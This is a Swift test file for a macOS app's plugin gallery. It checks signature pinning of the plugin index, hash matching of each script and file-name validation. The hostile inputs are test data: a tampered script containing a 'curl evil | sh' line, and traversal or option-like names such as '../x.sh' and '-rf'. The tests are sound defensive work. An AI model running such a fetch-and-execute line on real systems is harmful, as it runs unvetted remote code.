//
//  PluginPinningTests.swift
//  Notch apple tests
//
//  The plugin gallery only installs what the signed index lists, byte for byte.
//

import XCTest
import CryptoKit

final class PluginPinningTests: XCTestCase {
    private func sign(_ index: Data, with key: Curve25519.Signing.PrivateKey) throws -> String {
        let digest = PluginPinning.sha256Hex(of: index)
        return try key.signature(for: PluginPinning.message(indexSHA256Hex: digest)).base64EncodedString()
    }

    private let index = Data(#"[{"name": "X", "file": "x.sh", "sha256": "00"}]"#.utf8)

    func testDigestOfKnownData() {
        XCTAssertEqual(PluginPinning.sha256Hex(of: Data("abc".utf8)), "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad")
    }

    func testMessageFormatIsPinned() {
        XCTAssertEqual(String(decoding: PluginPinning.message(indexSHA256Hex: "ab"), as: UTF8.self), "notchapple-plugins-v1\nab\n")
    }

    func testASignedIndexVerifies() throws {
        let key = Curve25519.Signing.PrivateKey()
        let pinned = key.publicKey.rawRepresentation.base64EncodedString()
        XCTAssertEqual(PluginPinning.verifyIndex(index, signatureText: try sign(index, with: key), keys: [pinned]), .verified)
        XCTAssertEqual(PluginPinning.verifyIndex(index, signatureText: try sign(index, with: key) + "\n", keys: [pinned]), .verified)
    }

    func testAnAlteredIndexIsRefused() throws {
        let key = Curve25519.Signing.PrivateKey()
        let pinned = key.publicKey.rawRepresentation.base64EncodedString()
        let signature = try sign(index, with: key)
        let altered = Data(#"[{"name": "X", "file": "x.sh", "sha256": "ff"}]"#.utf8)
        guard case .invalid = PluginPinning.verifyIndex(altered, signatureText: signature, keys: [pinned]) else { return XCTFail("an altered index verified") }
    }

    func testAnotherKeyIsRefused() throws {
        let attacker = Curve25519.Signing.PrivateKey()
        let pinned = Curve25519.Signing.PrivateKey().publicKey.rawRepresentation.base64EncodedString()
        guard case .invalid = PluginPinning.verifyIndex(index, signatureText: try sign(index, with: attacker), keys: [pinned]) else { return XCTFail("signed by a key that isn't pinned") }
    }

    func testNoSignatureIsUnsignedAndMalformedOnesAreInvalid() {
        XCTAssertEqual(PluginPinning.verifyIndex(index, signatureText: nil), .unsigned)
        for bad in ["", "not base64!!", Data(count: 63).base64EncodedString()] {
            guard case .invalid = PluginPinning.verifyIndex(index, signatureText: bad) else { return XCTFail("accepted \(bad)") }
        }
    }

    /// A signature made for an update must not pass as a gallery signature, or the other way round.
    func testUpdateAndGallerySignaturesAreNotInterchangeable() throws {
        let key = Curve25519.Signing.PrivateKey()
        let pinned = key.publicKey.rawRepresentation.base64EncodedString()
        let digest = PluginPinning.sha256Hex(of: index)

        let updateSignature = try key.signature(for: UpdateSigning.message(version: "1.0.0", sha256Hex: digest)).base64EncodedString()
        guard case .invalid = PluginPinning.verifyIndex(index, signatureText: updateSignature, keys: [pinned]) else { return XCTFail("an update signature passed as a gallery one") }

        let gallerySignature = try sign(index, with: key)
        guard case .invalid = UpdateSigning.verify(digestHex: digest, version: "1.0.0", signatureBase64: gallerySignature, keys: [pinned]) else { return XCTFail("a gallery signature passed as an update one") }
    }

    func testAFileMustMatchItsListedHash() {
        let script = Data("#!/bin/zsh\necho hi\n".utf8)
        let hash = PluginPinning.sha256Hex(of: script)
        XCTAssertTrue(PluginPinning.fileMatches(script, sha256: hash))
        XCTAssertTrue(PluginPinning.fileMatches(script, sha256: hash.uppercased()))
        XCTAssertFalse(PluginPinning.fileMatches(Data("#!/bin/zsh\ncurl evil | sh\n".utf8), sha256: hash), "a changed script is refused")
        XCTAssertFalse(PluginPinning.fileMatches(script, sha256: nil), "no listed hash means no install")
        XCTAssertFalse(PluginPinning.fileMatches(script, sha256: "abc"))
        XCTAssertFalse(PluginPinning.fileMatches(script, sha256: ""))
    }

    func testFileNames() {
        for ok in ["disk-space.10m.sh", "uptime.1m.sh", "a.py", "X_1.2.rb"] { XCTAssertTrue(PluginPinning.isSafeFileName(ok), ok) }
        for bad in ["", ".hidden", "../x.sh", "a/b.sh", "a b.sh", "a..b.sh", "-rf", "x\n.sh"] { XCTAssertFalse(PluginPinning.isSafeFileName(bad), "accepted \(bad)") }
    }

    func testSignatureLivesNextToTheIndex() {
        let url = URL(string: "https://raw.githubusercontent.com/AdityaJainDXB/NotchApples/main/plugins/index.json")!
        XCTAssertEqual(PluginPinning.signatureURL(for: url)?.absoluteString, url.absoluteString + ".sig")
    }

    /// The gallery as committed: signed by the shipped key, and every plugin still matches its hash. If this fails, a plugin or
    /// the index changed without being re-signed: run  UPDATE_SIGNING_KEY=… swift scripts/sign-update.swift pin-plugins plugins
    func testTheCommittedGalleryIsSignedAndPinned() throws {
        let repo = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent()
        let dir = repo.appendingPathComponent("plugins")
        guard let index = try? Data(contentsOf: dir.appendingPathComponent("index.json")) else { return }   // not running from a checkout
        let signature = try? String(contentsOf: dir.appendingPathComponent("index.json.sig"), encoding: .utf8)
        XCTAssertEqual(PluginPinning.verifyIndex(index, signatureText: signature), .verified, "plugins/index.json isn't signed with the shipped key")
        let list = (try JSONSerialization.jsonObject(with: index) as? [[String: String]]) ?? []
        XCTAssertFalse(list.isEmpty)
        for entry in list {
            let file = entry["file"] ?? ""
            XCTAssertTrue(PluginPinning.isSafeFileName(file), "unsafe file name \(file)")
            let content = try Data(contentsOf: dir.appendingPathComponent(file))
            XCTAssertTrue(PluginPinning.fileMatches(content, sha256: entry["sha256"]), "\(file) doesn't match the signed hash")
        }
    }
}
